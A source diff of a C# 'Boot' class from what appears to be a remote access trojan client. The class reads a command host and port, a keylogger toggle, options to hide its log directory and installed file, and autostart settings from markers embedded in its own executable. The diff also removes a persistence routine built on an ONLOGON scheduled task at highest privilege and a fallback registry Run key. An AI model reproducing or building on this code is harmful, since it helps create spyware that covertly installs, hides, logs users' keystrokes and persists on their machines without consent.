@@ -2,55 +2,42 @@
 using Microsoft.Win32;
 using System;
 using System.Diagnostics;
-using System.Globalization;
 using System.IO;
-using System.Net;
-using System.Net.Sockets;
 
 namespace Client.Controllers.Tools
 {
     //BootController
-    public class Boot
+    public static class Boot
     {       
-        private string[] readerKey = { "host", "port", "recoTries", "identifier", "logDir", "startupName", "installPath", "txtSubDirI", "txtFileNameI", "chk"};
-
-        public string host                              { get; set; }     // HOST
-        public ushort port                              { get; set; }     // HOST
-        public int recoTries                            { get; set; }     // TIME BETWEEN RECONNECTION TRIES
-        public static string identifier                 { get; set; }     // CLIENT NAME IDENTIFIER
-        public static bool installStub                  { get; set; }     // INSTALL STUB
-        public static bool hideSubDirectory             { get; set; }     // INSTALL STUB
-        public static bool hideFile                     { get; set; }     // INSTALL STUB
-        public static string installSubDirectory = "";                    // INSTALL STUB
-        public static string installFileName     = "";                    // INSTALL STUB
-        public static bool keyloggerEnabled             { get; set; }     // KEYLOGGER
-        public static bool hideLogsDir                  { get; set; }     // KEYLOGGER
-        public string keyLoggerDirectory                { get; set; }     // KEYLOGGER
-        public static string startupName                { get; set; }     // AUTOSTART STUB
-        public static bool autoStartEnabled             { get; set; }     // AUTOSTART STUB
-
-        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData; //  	%USERPROFILE%\Application Data
+        private static string[] readerKey = { "host", "port", "recoTries", "identifier", "logDir", "startupName", "installPath", "txtSubDirI", "txtFileNameI", "chk"};
+        public static string host                              { get; set; }     // HOST
+        public static ushort port                              { get; set; }     // HOST
+        public static int recoTries                            { get; set; }     // TIME BETWEEN RECONNECTION TRIES
+        public static string identifier                        { get; set; }     // CLIENT NAME IDENTIFIER
+        public static bool installStub                         { get; set; }     // INSTALL STUB
+        public static bool hideSubDirectory                    { get; set; }     // INSTALL STUB
+        public static bool hideFile                            { get; set; }     // INSTALL STUB
+        public static string installSubDirectory = "";                           // INSTALL STUB
+        public static string installFileName     = "";                           // INSTALL STUB
+        public static bool keyloggerEnabled                    { get; set; }     // KEYLOGGER
+        public static bool hideLogsDir                         { get; set; }     // KEYLOGGER
+        public static string keyLoggerDirectory                { get; set; }     // KEYLOGGER
+        public static string startupName                       { get; set; }     // AUTOSTART STUB
+        public static bool autoStartEnabled                    { get; set; }     // AUTOSTART STUB
+        public static string specialPATH;
+        public static Environment.SpecialFolder SPECIALFOLDER;
         public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
 
-
-        public Boot()
+        public static void Initialization()
         {
             foreach (string index in readerKey)
             {
-                doSomethingWithReader(index);
+                readFile(index);
             }
             FixDirectory();
         }
 
-        public static string getMutexKey(StreamReader readerMutex)
-        {
-            string mutex = readerMutex.ReadToEnd();
-            mutex = mutex.Substring(mutex.IndexOf("-STARTmutex-"), mutex.IndexOf("-ENDmutex-") - mutex.IndexOf("-STARTmutex-"));
-            string mutexKey = mutex.Replace("-STARTmutex-", "");
-            return mutexKey;
-        }
-
-        public void doSomethingWithReader(string readerkey)
+        public static void readFile(string readerkey)
         {
             StreamReader reader = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
             
@@ -88,22 +75,15 @@ namespace Client.Controllers.Tools
             // INSTALL SETTINGS
             else if (readerkey == "installPath")
             {
-                string t = readerString.Replace("-START" + readerkey + "-", "");
-                if (t == "1")
-                    SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
-                else if (t == "2")
-                    SPECIALFOLDER = Environment.SpecialFolder.ProgramFilesX86;
-                else if (t == "3")
-                    SPECIALFOLDER = Environment.SpecialFolder.SystemX86;
-
+                specialPATH = readerString.Replace("-START" + readerkey + "-", "");
             }
             else if (readerkey == "txtSubDirI")
             {
-                startupName = readerString.Replace("-START" + readerkey + "-", "");
+                installSubDirectory = readerString.Replace("-START" + readerkey + "-", "");
             }
             else if (readerkey == "txtFileNameI")
             {
-                startupName = readerString.Replace("-START" + readerkey + "-", "");
+                installFileName = readerString.Replace("-START" + readerkey + "-", "");
             }
             // BOOLEENS
             else if (readerkey == "chk")
@@ -112,17 +92,18 @@ namespace Client.Controllers.Tools
                 string t = readerString.Replace("-START" + readerkey + "-", "");
                 foreach (char c in t)
                 {
-                    if      (i == 0)
+                    if (i == 0)
                         keyloggerEnabled = (c == '1' ? true : false);
                     else if (i == 1)
-                        autoStartEnabled = (c == '1' ? true : false);
+                        hideLogsDir      = (c == '1' ? true : false);                    
                     else if (i == 2)
-                        hideSubDirectory = (c == '1' ? true : false);
+                        autoStartEnabled = (c == '1' ? true : false);
                     else if (i == 3)
-                        hideFile         = (c == '1' ? true : false);
+                        installStub      = (c == '1' ? true : false);
                     else if (i == 4)
-                        hideLogsDir      = (c == '1' ? true : false);
-
+                        hideSubDirectory = (c == '1' ? true : false);
+                    else if (i == 5)
+                        hideFile         = (c == '1' ? true : false);
                     i++;
                 }
             }
@@ -131,12 +112,26 @@ namespace Client.Controllers.Tools
                 reader.Close();
                 return;
             }
-
             reader.Close(); 
         }
 
         static void FixDirectory()
         {
+            switch (specialPATH)
+            {
+                case "1":
+                    SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
+                    break;
+                case "2":
+                    SPECIALFOLDER = Environment.SpecialFolder.ProgramFilesX86;
+                    break;
+                case "3":
+                    SPECIALFOLDER = Environment.SpecialFolder.SystemX86;
+                    break;
+            }
+
+            DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
+
             if (AuthenticationController.Win64Bit) return;
 
             // https://msdn.microsoft.com/en-us/library/system.environment.specialfolder(v=vs.110).aspx
@@ -151,39 +146,6 @@ namespace Client.Controllers.Tools
             }
 
             DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
-        }
-
-        public static bool AddToStartup()
-        {
-            if (AuthenticationController.getAccountType() == "Admin")
-            {
-                try
-                {
-                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
-                    {
-                        Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + ClientData.currentPath + "\" /rl HIGHEST /f",
-                        UseShellExecute = false,
-                        CreateNoWindow = true
-                    };
-
-                    Process p = Process.Start(startInfo);
-                    p.WaitForExit(1000);
-                    if (p.ExitCode == 0) return true;
-                }
-                catch (Exception)
-                {
-                }
-
-                return StartupManagerController.addRegistryKeyValue(RegistryHive.CurrentUser,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, ClientData.currentPath,
-                    true);
-            }
-            else
-            {
-                return StartupManagerController.addRegistryKeyValue(RegistryHive.CurrentUser,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, ClientData.currentPath,
-                    true);
-            }
         }
     }
 }
